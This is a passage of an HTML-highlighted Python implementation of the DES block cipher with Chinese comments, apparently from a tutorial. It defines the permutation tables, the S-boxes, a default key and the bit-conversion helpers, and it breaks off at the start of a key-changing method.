function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 出初始化DES加密的参数</span></span><br><span class="line">        self.ip = [</span><br><span class="line">            <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">        ]  <span class="comment"># ip置换</span></span><br><span class="line"> </span><br><span class="line">        self.ip1 = [</span><br><span class="line">            <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">            <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># 逆ip置换</span></span><br><span class="line">        self.E = [</span><br><span class="line">            <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">            <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">            <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">            <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>,</span><br><span class="line">        ]  <span class="comment"># E置换，将32位明文置换位48位</span></span><br><span class="line">        self.P = [</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># P置换，对经过S盒之后的数据再次进行置换</span></span><br><span class="line">        <span class="comment"># 设置默认密钥</span></span><br><span class="line">        self.K = <span class="string">&#x27;0111010001101000011010010111001101101001011100110110100101110110&#x27;</span></span><br><span class="line">        self.k1 = [</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">            <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        ]  <span class="comment"># 密钥的K1初始置换</span></span><br><span class="line">        self.k2 = [</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">            <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">            <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>,</span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        self.k0 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, ]  <span class="comment"># 秘钥循环移位的位数</span></span><br><span class="line"> </span><br><span class="line">        self.S = [</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x5</span>, <span class="number">0x0</span>,</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xb</span>, <span class="number">0x5</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xb</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x9</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xe</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>,</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x9</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0x7</span>, <span class="number">0x8</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0xe</span>,</span><br><span class="line">                <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x9</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x3</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xc</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x9</span>, <span class="number">0x2</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>,</span><br><span class="line">                <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x9</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xb</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0xf</span>, <span class="number">0xa</span>, <span class="number">0xb</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0x2</span>, <span class="number">0xe</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x1</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0xb</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0xe</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x8</span>, <span class="number">0x6</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0xc</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x3</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x9</span>, <span class="number">0x2</span>,</span><br><span class="line">                <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xc</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xa</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xb</span>,</span><br><span class="line">            ],</span><br><span class="line">        ]  <span class="comment"># 16进制表示S盒的数据，S盒是为了将48位转换为32位，有8个盒子</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__substitution</span>(<span class="params">self, table: <span class="built_in">str</span>, self_table: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param table: 需要进行置换的列表,是一个01字符串</span></span><br><span class="line"><span class="string">        :param self_table: 置换表，在__init__中初始化了</span></span><br><span class="line"><span class="string">        :return: 返回置换后的01字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        sub_result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self_table:</span><br><span class="line">            sub_result += table[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> sub_result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2bin</span>(<span class="params">self, string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将明文转为二进制字符串:</span></span><br><span class="line"><span class="string">        :param string: 任意字符串</span></span><br><span class="line"><span class="string">        :return:二进制字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        plaintext_list = <span class="built_in">list</span>(<span class="built_in">bytes</span>(string, <span class="string">&#x27;utf8&#x27;</span>))  <span class="comment"># 将字符串转成bytes类型，再转成list</span></span><br><span class="line">        result = []  <span class="comment"># 定义返回结果</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> plaintext_list:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))  <span class="comment"># 将列表的每个元素转成二进制字符串，8位宽度</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bin2str</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        二进制字符串转成字符串</span></span><br><span class="line"><span class="string">        :param binary:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))  <span class="comment"># 对二进制转成int</span></span><br><span class="line">        result = <span class="built_in">bytes</span>(list_int).decode()  <span class="comment"># 将列表转成bytes，在进行解码，得到字符串</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bin2int</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        由于加密之后的二进制无法直接转成字符，有不可见字符在，utf8可能无法解码，所以需要将二进制字符串每8位转成int型号列表，用于转成bytes再转hex</span></span><br><span class="line"><span class="string">        :param binary: 二进制字符串</span></span><br><span class="line"><span class="string">        :return: int型列表</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        list_bin = [binary[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">8</span>)]  <span class="comment"># 对二进制字符串进行切分，每8位为一组</span></span><br><span class="line">        list_int = []</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> list_bin:</span><br><span class="line">            list_int.append(<span class="built_in">int</span>(b, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> list_int</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__int2bin</span>(<span class="params">self, list_int: <span class="built_in">list</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> list_int:</span><br><span class="line">            result.append(<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get_block_list</span>(<span class="params">self, binary: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        对明文二进制串进行切分，每64位为一块，DES加密以64位为一组进行加密的</span></span><br><span class="line"><span class="string">        :type binary: 二进制串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        len_binary = <span class="built_in">len</span>(binary)</span><br><span class="line">        <span class="keyword">if</span> len_binary % <span class="number">64</span> != <span class="number">0</span>:</span><br><span class="line">            binary_block = binary + (<span class="string">&quot;0&quot;</span> * (<span class="number">64</span> - (len_binary % <span class="number">64</span>)))</span><br><span class="line">            <span class="keyword">return</span> [binary_block[i:i + <span class="number">64</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_block), <span class="number">64</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> [binary[j:j + <span class="number">64</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary), <span class="number">64</span>)]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">modify_secretkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        修改默认密钥函数</span></span><br><span class="line"><span class="string">        :return: None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        